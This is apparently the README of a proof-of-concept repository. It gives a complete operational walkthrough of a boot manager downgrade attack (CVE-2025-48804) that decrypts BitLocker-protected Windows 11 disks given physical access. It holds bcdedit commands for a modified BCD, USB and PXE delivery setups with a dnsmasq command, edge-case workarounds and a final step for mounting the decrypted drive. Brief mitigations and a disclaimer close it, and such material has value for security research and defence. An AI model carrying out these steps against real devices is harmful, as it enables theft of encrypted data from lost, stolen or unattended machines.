# BitUnlocker Downgrade Attack

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)

A proof of concept for accessing BitLocker-encrypted disks **in under 5 minutes** on fully patched Windows 11 machines through a boot manager downgrade attack, leveraging the SDI vulnerability originally documented as **CVE-2025-48804**. The July 2025 patch fixes this in `bootmgfw.efi`, so any pre-patch `bootmgfw.efi` signed under PCA 2011 can be used for a downgrade attack, provided the target system trusts this PCA.

This PoC provides two delivery methods: **USB boot** (simpler and recommended) and **PXE boot**. But theoretically, you could also just copy an SDI boot file into one of the default unencrypted partitions (ESP & Recovery) and not bother with USB or PXE - see "Edge cases" table.

This work builds entirely on the research by **Microsoft STORM** (Netanel Ben Simon and Alon Leviev):
> [BitUnlocker: Leveraging Windows Recovery to Extract BitLocker Secrets](https://techcommunity.microsoft.com/blog/microsoft-security-blog/bitunlocker-leveraging-windows-recovery-to-extract-bitlocker-secrets/4442806)

---

## Prerequisites

- Physical access to a BitLocker-encrypted device (TPM-only, PCR 7 + 11)
- The device's Secure Boot database still trusts the **Microsoft Windows PCA 2011** certificate
- A USB stick (recommended) **or** a Linux machine with `dnsmasq` and an Ethernet cable for PXE

## Step-by-step

### 1. Download boot_patched.sdi from Releases (or build your own SDI file, see below)

Put it in `USB/sdi/` (for USB method) or `TFTP-root/sdi/` (for PXE method).

### 2. Prepare the modified BCD

On the target device, open a WinRE command prompt (hold **Shift** while clicking **Restart**, then **Troubleshoot > Command Prompt** — click "Ignore this disk" when prompted for a BitLocker recovery key and click "relaunch" if you're also told that the cmd prompt cannot run on a locked device — and if the cmd prompt just won't open, use your own WinPE if you can). Plug in a USB stick and run:

```bat
E: (or wherever your USB is)
bcdedit /export BCD_modded
bcdedit /store BCD_modded /set {default} path \WINDOWS\system32\winload_DOESNOTEXIST.efi
bcdedit /store BCD_modded /enum all
```

In the output, find the device options entry whose description is **"Windows Recovery"** and which contains `ramdisksdidevice` / `ramdisksdipath` entries. Note its GUID, then:

```bat
bcdedit /store BCD_modded /set {GUID} ramdisksdidevice boot
bcdedit /store BCD_modded /set {GUID} ramdisksdipath \sdi\boot_patched.sdi
move BCD_modded BCD
```

Place the resulting `BCD` file in the appropriate location depending on your method:
- **USB:** `USB/EFI/Microsoft/Boot/BCD`
- **PXE:** `TFTP-root/Boot/BCD`

### 3. Boot the target

#### Option A: USB boot (recommended)

Format a USB stick as **FAT32** and copy the contents of the `USB/` directory to its root (only its content, there should not be a "USB" folder). The USB stick should look like this:

```
USB stick root/
├── EFI/
│   ├── Boot/
│   │   └── bootx64.efi        # Pre-patch boot manager (PCA 2011)
│   └── Microsoft/
│       └── Boot/
│           └── BCD             # Your modified BCD
└── sdi/
    └── boot_patched.sdi        # Patched SDI with custom WinRE
```

Plug the USB stick into the target and trigger a UEFI USB boot — either from WinRE (**Use a device**) or by pressing the manufacturer's boot menu key at power-on (F12, F9, etc.). If the USB stick doesn't appear in the list of boot options, look for a **"Boot from file"** option in the UEFI boot menu, then navigate to `EFI/Boot/bootx64.efi` on the USB stick.

#### Option B: PXE boot

The `TFTP-root/` directory is structured as follows:

```
TFTP-root/
├── bootmgfw.efi                # Pre-patch boot manager (PCA 2011)
├── Boot/
│   └── BCD                     # Your modified BCD
├── EFI/
│   └── Microsoft/
│       └── Boot/
│           └── bootmgfw.efi    # Same pre-patch boot manager
└── sdi/
    └── boot_patched.sdi        # Patched SDI with custom WinRE
```

Connect the target to your Linux machine via Ethernet and start the PXE server:

```bash
cd BitUnlocker
export INTERFACE=<your-interface>
export ABS_TFTP_ROOT=$(pwd)/TFTP-root

sudo ifconfig $INTERFACE 10.13.37.1
sudo dnsmasq --no-daemon \
  --interface="$INTERFACE" \
  --dhcp-range=10.13.37.100,10.13.37.101,255.255.255.0,1h \
  --dhcp-boot=bootmgfw.efi \
  --enable-tftp \
  --tftp-root="$ABS_TFTP_ROOT" \
  --log-dhcp \
  --tftp-max=65464 \
  --port=0
```

Trigger PXE boot on the target — from WinRE select **Use a device > IPv4 Network**, or press the manufacturer's PXE boot key.

### 4. Wait for the SDI transfer

The boot manager will load the BCD, then start downloading `boot_patched.sdi`. The SDI file is large (~300 MB) so this takes a moment from USB, or **several minutes** over TFTP. A recovery-related message with the SDI path should appear on the target screen while it loads.

### 5. Profit

Once the transfer completes, a command prompt should appear with the OS volume decrypted and mounted (typically `C:` or `E:`). If it wasn't mounted automatically or you don't want to guess the letter, just run `diskpart` -> `sel vol X` (the one that looks like your encrypted drive) -> `assign letter=C` (or something else) -> `exit` -> profit

### Edge cases

| Situation | What happens |
|---|---|
| BitLocker configured with a **PIN** you know | Blue screen at boot — type the PIN blindly (sorry I haven't bothered with BitLocker fonts in this repo) and press Enter |
| Blue screen, no PIN | Target has likely migrated to CA 2023 — press Escape and let the SDI transfer finish anyway, but the BitLocker-encrypted drive will most likely be locked at the end |
| USB-C / Thunderbolt only | Use a USB-C drive or USB-Ethernet adapter (for PXE) |
| TFTP file not found (other than garbage Font files which we don't care about) | File names are case-sensitive — rename `bootmgfw.efi` to match what the target requests |
| No PXE or USB boot allowed | Check available size of ESP & Recovery partitions (`diskpart` -> `list vol`). If there's enough room for the provided Boot.sdi file (which is around 300Mb) in either partition, put it there. Then, the exploit will be slightly different (but still just as quick) as you will need to directly modify the BCD file of the target system (please make a backup) to point to the unencrypted host partition (`ramdisksdidevice` BCD entry in particular), and replace the bootmgfw.efi of your target with the one provided in the TFTP folder of this repo. In this case, make sure to check that the boot manager of your target is signed by PCA 2011 (exploit wouldn't work in that case anyway, always check that), otherwise you'll put the system into BitLocker recovery. Also, if there is not enough room for the Boot.sdi file I provided in this repo, you could try to make your own smaller version, there are definitely some ways to do that (see "Build your own SDI file" section below) |

---

## Build your own SDI file

I've included two scripts in `scripts/`:
- `patch_sdi.py` — builds a modified SDI file from a `boot.sdi` and a `WinRE.wim` file
- `parse_sdi.py` — parses an SDI file to validate its structure and content

The `boot_patched.sdi` file provided in Releases contains a modified WinRE.wim where the launch app is `cmd.exe`.

## Unexploitable cases

- **TPM + PIN or TPM + key file** is configured and the attacker doesn't know it
- **KB5025885 is installed / the boot manager has been migrated to CA 2023** — machines freshly installed since early 2026 likely ship with a CA 2023-signed `bootmgfw.efi` by default. To check, mount the EFI partition and inspect the active binary: `mountvol S: /s` then `sigcheck -i S:\EFI\Microsoft\Boot\bootmgfw.efi`. Note that `C:\Windows\Boot\EFI\bootmgfw.efi` may differ from the file actually used at boot — always check the EFI partition copy.
- **Non-default PCR policy** — configurations involving PCR 0, 2, or 4 will detect the change in boot path
- **PCA 2011 revoked via DBX** — if the old certificate has been explicitly distrusted

---

## Mitigations

- **Enable TPM + PIN** — a pre-boot PIN prevents the TPM from unsealing the VMK without user interaction, regardless of boot path manipulation. Keep in mind however that it wouldn't stop an insider who has knowledge of the PIN.
- **Migrate to Windows UEFI CA 2023 and apply [KB5025885](https://support.microsoft.com/en-us/topic/kb5025885-how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023-24932-41a975df-beb2-40c1-99a3-b3ff139f832d) to prevent downgrade attacks altogether**

---

## Credits

**Microsoft STORM (Netanel Ben Simon and Alon Leviev)** for the original BitUnlocker research and vulnerability disclosure.

---

## License

This project is licensed under the [MIT License](LICENSE). See the [LICENSE](LICENSE) file for details.

## Disclaimer

This repository and all its contents are provided strictly for **authorized security testing and research purposes**. Only use this tool on systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal. The author assumes no liability for any misuse or damage resulting from the use of this material.
